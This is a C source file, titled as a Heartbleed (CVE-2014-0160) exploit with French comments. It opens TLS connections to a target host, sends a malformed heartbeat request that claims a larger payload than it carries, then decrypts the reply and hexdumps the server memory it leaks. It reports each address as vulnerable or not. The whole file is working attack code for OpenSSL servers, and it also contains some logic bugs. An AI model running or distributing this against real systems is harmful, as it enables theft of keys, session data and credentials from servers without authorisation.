/**
 * Heartbleed Exploit / CVE-2014-0160 
 * Author: nuggets - /Vv99375
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netdb.h>
#include <errno.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/select.h>
#include <openssl/ssl.h>
#include <pthread.h>

/*
 * Gestion des erreurs
 */
#define CREATE_SOCK_ERROR               2
#define CONNECT_SOCK_ERROR              4
#define CREATE_SSLSTRUCT_ERROR          8
#define CREATE_BIO_ERROR               16 
#define SSL_HANDSHAKE_ERROR            32
#define RESOLV_DOMAIN_ERROR            64
#define HEARTBEAT_NOT_SUPPORTED       128
#define BIO_READ_ERROR                256
#define DECRYPT_ERROR                 512
#define NO_RESPONSE                  1024
#define ANOTHER_RESPONSE             4096
#define CONN_CLOSED_AFTER_HBREQ      8192

#define MAXPAYLOAD               65535  /* En fait la vraie valeur max est de 16384.
					 * Conformément au RFC 6520, OpenSSL ne crée
					 * pas de réponse hb avec une charge de plus
					 * de 2^14 Même si la taille de la requête 
					 * hb est supérieure... 
					 */

#define DEFAULT_TIMEOUT   200   // millisecondes

int verbose = 0;
int timeout = DEFAULT_TIMEOUT;
int handshake_succeeded = 0;

/* Pour un nom de domaine donné, chaque ip renvoyé par le dns
 * Sera testée. Le résultat d'une ip sera enregistré dans un objet
 * de type "res_ip" pour analyse et interprétation ultérieure.
 */
typedef struct _results_ip {
  char* ip;
  int isvulnerable;
  int error;
  pthread_t thread_timeout;
  struct _results_ip* next;
} res_ip;

char hbheader[] = "\x18\x03\01\00\00";
char hbmsg[] = "\x01\x00\x02\x5a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char c_hbmsg[1024];

char c_hbresp[MAXPAYLOAD];
char hbresp[MAXPAYLOAD];

SSL_CTX* ctx;

res_ip* new_res_ip(char* ip) {
  res_ip* rip = calloc(1, sizeof(res_ip));
  if(ip)
    rip->ip = strdup(ip);
  return rip;
}

res_ip* add_res_ip(res_ip* list, char* ip) {
  res_ip* new = new_res_ip(ip);
  new->next = list;
  return new;
}

void free_res_ip_list(res_ip* rip) {
  res_ip* tmp;
  while(rip != NULL) {
    tmp = rip;
    rip = rip->next;
    free(tmp->ip);
    free(tmp);
  }
}

void* timeout_handshake(void* args) {
  int i = -1;

  // timeout est toujours en millisecondes
  struct timespec treq, trem;
  treq.tv_sec = timeout / 1000;
  treq.tv_nsec = (timeout % 1000) * 1000000;
  trem = treq;

  while(i != 0) {
    i = nanosleep(&treq, &trem);
    if(i == -1 && errno == EINTR) 
      treq = trem;
  }

  if(handshake_succeeded == 0) {
    close(*((int*)args));
  }

  pthread_exit(args);
  return NULL;
}

/*
 * attend qlqs ms, 
 * renvoie -1 si rien n'a été reçu et que la connexion est toujours active
 * renvoie 0 si rien n'a été reçu et la connexion est fermée 
 * renvoie une valeur positive si la des données ont été reçues. 
 * Cette valeur est le nombre d'octets prêts à être lus. 
 */
int is_readable(int sock, struct timeval* tv) {
  fd_set rfd;
  int ret;
  int n = 0;

  FD_ZERO(&rfd);
  FD_SET(sock, &rfd);
  
  ret = select(sock+1, &rfd, 0, 0, tv);
  if(ret == -1)
    perror("Erreur inattendue select");

  if (!FD_ISSET(sock, &rfd))
    return -1;
  ioctl(sock, FIONREAD, &n);

  return n;
}

int turn_in_nonblocking(int sock) {
  int arg = fcntl(sock, F_GETFL, NULL); 
  arg |= O_NONBLOCK; 
  fcntl(sock, F_SETFL, arg); 
  return 0;
}

int turn_in_blocking(int sock) {
  int arg = fcntl(sock, F_GETFL, NULL); 
  arg &= ~O_NONBLOCK; 
  fcntl(sock, F_SETFL, arg); 
  return 0;
}

int wait_data_to_read(int sock, struct timeval* tv) {
  int ret;
  fd_set fdset;

  FD_ZERO(&fdset);
  FD_SET(sock, &fdset);
  
  ret = select(sock + 1, NULL, &fdset, NULL, tv);
  if(ret == 1) {
    socklen_t len = sizeof(ret);
    // Y a t il eu une erreur ?
    int err = getsockopt(sock, SOL_SOCKET, SO_ERROR, &ret, &len);
    if(err == -1 || ret != 0) {
      ret = -1;
      perror("Erreur connect_socket: ");
    } else {
      return 0;
    }
  }
  return -1;
}

int connect_socket(int sock, struct sockaddr_in* sinserv, struct timeval* tv) {
  int arg;
  int ret;

  turn_in_nonblocking(sock);
  connect(sock, (struct sockaddr*)sinserv, sizeof(*sinserv));
  ret = wait_data_to_read(sock, tv);
  turn_in_blocking(sock);
  return ret;
}

// Déchiffre ctext (texte chiffré) et enrégistre le clair dans ptext.
// ectx doit etre initialisé avec les paramètre du chiffre (algorithme, 
// clé, vecteur d'initialisation, etc.)
int decrypt(EVP_CIPHER_CTX *ectx, unsigned char *ctext, int ctext_len,	\
	    unsigned char *plaintext) {
  EVP_CIPHER_CTX *ctx;
  int ret;
  int len;
  int plaintext_len;
  
  ctx = ectx;
  if(ctx == NULL) {
    fprintf(stderr, "Erreur: contexte de chiffrement NULL\n");
    return -1;
  }

  ret = EVP_DecryptUpdate(ctx, plaintext, &len, ctext, ctext_len);
  if(ret != 1) {
    fprintf(stderr, "Erreur de déchiffrement 1 !\n");
    return -1;
  }   
  plaintext_len = len;
  
  ret = EVP_DecryptFinal_ex(ctx, plaintext + len, &len);
  if(ret != 1) {
    ERR_print_errors_fp(stderr);
    fprintf(stderr, "Erreur de déchiffrement 2!\n");
    return -1;
  }
  plaintext_len += len;
  
  return plaintext_len;
}

// Chiffre ...
int encrypt(EVP_CIPHER_CTX *ectx, unsigned char *plaintext, int plaintext_len, \
	    unsigned char *ctext) {
  EVP_CIPHER_CTX *ctx;
  int ret;
  int len;
  int ctext_len;
  
  ctx = ectx;
  ret = EVP_EncryptUpdate(ctx, ctext, &len, plaintext, plaintext_len);
  if(ret != 1) {
    fprintf(stderr, "Erreur de chiffrement 1 !\n");
    return -1;
  }   
  ctext_len = len;
  
  ret = EVP_EncryptFinal_ex(ctx, ctext + len, &len);
  if(ret != 1) {
    ERR_print_errors_fp(stderr);
    fprintf(stderr, "Erreur de chiffrement 2!\n");
    return -1;
  }
  ctext_len += len;
  
  return ctext_len;
}

void hexdump(char* buf, int len) {
  int i;
  for(i = 0; i < len; i++) 
    printf("%.2hhx ", buf[i]);
}

void chardump(char* buf, int len) {
  int i;
  for(i = 0; i < len; i++) 
    printf("%c ", buf[i]);
}

res_ip* is_vulnerable(char* domain, char* port) {
  char* tmp_hbresp = NULL;
  char* tmp_c_hbresp = NULL;
  short record_size = 0;
  int ret = 0;
  int i = 0;
  int err = 0;
  int is_vulnerable = 0;
  int sock = 0;
  int nrecved = 0;
  int decrypted = 0;
  int conn_closed = 0;
  res_ip* result_list = NULL;
  res_ip* result_list_tmp = NULL;
  struct addrinfo criteres, *ipadresses = NULL;
  struct timeval tv = { 0, 0 };
  struct sockaddr_in* sinserv = NULL;
  SSL* ssl = NULL;
  BIO* bio = NULL;
  pthread_attr_t attr;
  pthread_t thread_timeout;

  // Résolution "domain" -> ip 
  memset(&criteres, 0, sizeof(criteres));
  criteres.ai_family = AF_INET;
  criteres.ai_socktype = SOCK_STREAM;
  criteres.ai_flags = AI_NUMERICSERV;
  
  ret = getaddrinfo(domain, port, &criteres, &ipadresses);
  if(ret) {
    fprintf(stderr, "Impossible de résoudre le nom de domaine %s\n", domain);
    return NULL;
  }
  
  struct addrinfo* iptmp = ipadresses;
  
  do {
    ssl = NULL;
    sinserv = (struct sockaddr_in*)iptmp->ai_addr;
    result_list = add_res_ip(result_list, inet_ntoa(sinserv->sin_addr));
    
    // Connexion du socket sock au serveur 
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sock == -1) { 
      err |= CREATE_SOCK_ERROR;
      goto nextip;
    }
    
    tv.tv_sec = 1; tv.tv_usec = 0;
    ret = connect_socket(sock, sinserv, &tv); 
    //printf("yaehhh, ret = %d\n", ret);	
    if(ret < 0) {
      err |= CONNECT_SOCK_ERROR;
      goto nextip;
    }
        
    // Initialisation d'une session ssl 
    ssl = SSL_new(ctx);
    if(ssl == NULL) {
      err |= CREATE_SSLSTRUCT_ERROR;
      goto nextip;
    }

    SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);
    bio = BIO_new_socket(sock, BIO_NOCLOSE);
    if(bio == NULL) {
      err |= CREATE_BIO_ERROR;
      goto nextip;
    }    
    SSL_set_bio(ssl, bio, bio);
    
    err = pthread_attr_init(&attr);
    if(err != 0)
      fprintf(stderr, "Erreur attr_init\n");
    err = pthread_create(&(result_list->thread_timeout), &attr, &timeout_handshake, &sock);
    // Handshake SSL 
    ret = SSL_connect(ssl);
    if(ret <= 0) {
      err |= SSL_HANDSHAKE_ERROR;
      goto nextip;
    }

    if(((ssl->tlsext_heartbeat) & 0x00000001) == 0) {
      err |= HEARTBEAT_NOT_SUPPORTED;
    }

    int send_size = sizeof(hbmsg) - 1;
    ssl->s3->wnum = 0;
    //Envoie du heartbeat
    ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, hbmsg, sizeof(hbmsg) - 1);  

    // attente en secondes + microsecondes
    // timeout est toujours en millisecondes
    tv.tv_sec = timeout / 1000;
    tv.tv_usec = (timeout % 1000) * 1000; 
    
    int maybeagain = 0;
    int nbytes = 0;
    do {
      ret = is_readable(sock, &tv);
      if(ret == 0) {
	err |= CONN_CLOSED_AFTER_HBREQ;
	if(nbytes == 0)
	  goto nextip;
	maybeagain = 0;
      } else if(ret > 0) {
	maybeagain = 1;
	nbytes += ret;
      } else if(ret < 0) {
	maybeagain = 0;
      }
    } while(maybeagain && nbytes < MAXPAYLOAD);

    if(nbytes == 0) {
      err |= NO_RESPONSE;
      goto nextip;
    }
    // Si nous arrivons ici, c'est qu'il y a quelques octets à récupérer
    // sur le socket.
    conn_closed = 0;
    if(err | CONN_CLOSED_AFTER_HBREQ == CONN_CLOSED_AFTER_HBREQ) 
      conn_closed = 1;

    // réception
    ret = recv(sock, c_hbresp, MAXPAYLOAD, 0);        
    if(ret <= 0) {
      err |= BIO_READ_ERROR;
      goto nextip;
    }    
    
    nrecved = ret;
    record_size = 0;
    decrypted = 0;
    ret = 0;
    tmp_hbresp = hbresp - 5;
    tmp_c_hbresp = c_hbresp - 5;
    
    // déchiffrement
    do {
      tmp_c_hbresp += record_size + 5;
      tmp_hbresp += ret + 5;

      memcpy(tmp_hbresp, tmp_c_hbresp, 5); // copie de l'entete du record
      record_size = ntohs(*((short*)&(tmp_hbresp[3])));
      if(decrypted + record_size > nrecved) 
	record_size = (decrypted + record_size) - nrecved;

      ret = decrypt(ssl->enc_read_ctx, tmp_c_hbresp + 5, record_size, 
		    tmp_hbresp + 5);
      if(ret < 0) {
	err |= DECRYPT_ERROR;
	if(decrypted > 0)
	  err |= ANOTHER_RESPONSE;
	goto nextip;
      }
      if(verbose) {
	printf("msg received hex:");
	hexdump(tmp_hbresp, ret + 6);
	printf("\n");
      }
      decrypted += record_size;
    } while(tmp_hbresp[0] != 0x18 && decrypted < nrecved - 5); // tant qu'il y a d'autres records et qu'on n'est pas encore tombé sur le HBRecords

    if(tmp_hbresp[0] != 0x18) {
      err |= ANOTHER_RESPONSE;
      //printf("resp: %.2hhx\n", tmp_hbresp[0]);
      if(conn_closed)
	err |= CONN_CLOSED_AFTER_HBREQ;
      goto nextip;
    }
  
    tmp_hbresp += 5; // on the payload of the record
    int recved_size = ret - 21 - 16; // totalsize - Hash - padding - Header(responsetype + size). ret correspond au nombre d'octet du dernier texte déchiffré.
    
    if(verbose) {
      printf("%d bytes in heartbeat response\n", recved_size - 3);  
      printf("hex: ");
      hexdump(tmp_hbresp + 3, recved_size - 3);
      
      printf("\nstr: ");
      chardump(tmp_hbresp + 3, recved_size - 3);
      printf("\n");
    }

    if(recved_size <= send_size) {
      result_list->isvulnerable = 0;
      err = 0;
    } else {
      result_list->isvulnerable = 1;
    }
        
  nextip:
    result_list->error = err;
    iptmp = iptmp->ai_next;
    if(ssl) {
      SSL_shutdown(ssl);
      SSL_free(ssl);
    }
  } while(iptmp != NULL);
  
  freeaddrinfo(ipadresses);

  result_list_tmp = result_list;
  while(result_list_tmp != NULL) {
    pthread_join(result_list_tmp->thread_timeout, NULL);
    result_list_tmp = result_list_tmp->next;
  }
  return result_list;
}

void usage_exit() {
  fprintf(stderr, "Usage: ./heartbleed --host cible [--port numport] [--t timeout] [--verbose]\n");
  exit(EXIT_FAILURE);
}

int main(int argc, char* argv[]) {
  int ret;
  char* domain = "localhost.fr";
  char* port = "443"; 
  res_ip* results;
  
  if(argc == 1) {
    usage_exit();
  }

  if(argc > 1)  {
    int i = 1;
    while(i < argc) {
      if((strcasecmp(argv[i], "-p") == 0) || (strcasecmp(argv[i], "--port") == 0)) {
	if(i+1 < argc) {
	  port = argv[++i];
	} else {
	  usage_exit();
	}
	continue;
      }

      if(strcasecmp(argv[i], "--host") == 0) {
	if(i+1 < argc) {
	  domain = argv[++i];
	} else {
	  usage_exit();
	}
	continue;
      }

      if((strcasecmp(argv[i], "-h") == 0) || (strcasecmp(argv[i], "--help") == 0)) {
	  usage_exit();
      }

      if((strcasecmp(argv[i], "-t") == 0) || (strcasecmp(argv[i], "--timeout") == 0)) {
	timeout = atoi(argv[++i]);
	if(timeout == 0) 
	  timeout = DEFAULT_TIMEOUT;
	continue;
      }

      if((strcasecmp(argv[i], "-v") == 0) || (strcasecmp(argv[i], "--verbose") == 0)) {
	verbose = 1;
      }

      i++;
    }
  }

  // Load des librairies SSL
  SSL_library_init();  
  // Création du contexte des connexions 
  // (TLSv1, pas de vérification du certificat) 
  const SSL_METHOD* meth = TLSv1_client_method(); 
  ctx = SSL_CTX_new(meth);
  results = is_vulnerable(domain, port);
  printf("%s:\n", domain);
  res_ip* tmp = results;
  int is_vulnerable = analyze_and_print_results(results, domain, port);
  free_res_ip_list(results);
  SSL_CTX_free(ctx);

  return is_vulnerable;
}

int analyze_and_print_results(res_ip* results, char* domain, char* port) {
  int ret;
  int i = 1;
  int deja = 0;
  int err;
  char* spaces;

  if(results) 
    ret = analyze_and_print_results(results->next, domain, port);
  else 
    return -1;
  
  printf("%s", results->ip);  
  if(results->isvulnerable) {
    printf("Vulnerable\n");
    return 0;
  }
  
  spaces = strdup(results->ip);
  memset(spaces, ' ', strlen(spaces));
  
  err = results->error;
  //printf("err = %x\n",err);

  while(i != 0) {
    spaces[0] = ( i == 1 ? 0 : '>');
    switch(err & i) {
    case HEARTBEAT_NOT_SUPPORTED:
      printf("%s\tHeartbeat non supporté sur %s!\n", spaces, domain);
      break;
    case RESOLV_DOMAIN_ERROR: 
      printf("%s\tErreur de résolution du nom de domaine %s!\n", spaces, domain);
      break;
    case SSL_HANDSHAKE_ERROR:
      printf("%s\tEchec du Handshake SSL!\n", spaces);
      break;
    case CREATE_SOCK_ERROR: 
      printf("%s\tErreur lors de la création du socket!\n", spaces);
      break;
    case CONNECT_SOCK_ERROR: 
      printf("%s\tErreur lors du connect à %s:%s!\n", spaces, domain, port);
      break;
    case CREATE_SSLSTRUCT_ERROR: 
      printf("%s\tErreur de creation de la session SSL!\n", spaces);
      break;
    case CREATE_BIO_ERROR: 
      printf("%s\tErreur d'allocation d'un objet BIO!\n", spaces);
      break;
    case BIO_READ_ERROR: 
      printf("%s\tErreur de lecture de l'objet BIO!\n", spaces);
      break;
    case DECRYPT_ERROR: 
      printf("%s\tErreur de dechiffrement du message reçu!\n", spaces);
      break;
    case CONN_CLOSED_AFTER_HBREQ:
      printf("%s\tLe serveur a fermé la connexion!\n", spaces);
      break;
    case ANOTHER_RESPONSE:
      printf("%s\tLe serveur a renvoyé un record qui n'est pas un battement de coeur (HB) !\n", spaces);
      break;
    default:
      {
	if(!deja)
	  printf("%s\tNon Vulnerable\n", spaces);
	deja = 1;	
      }
    }    
    i <<= 1;
  }

  free(spaces);
  return ret;    
}

 
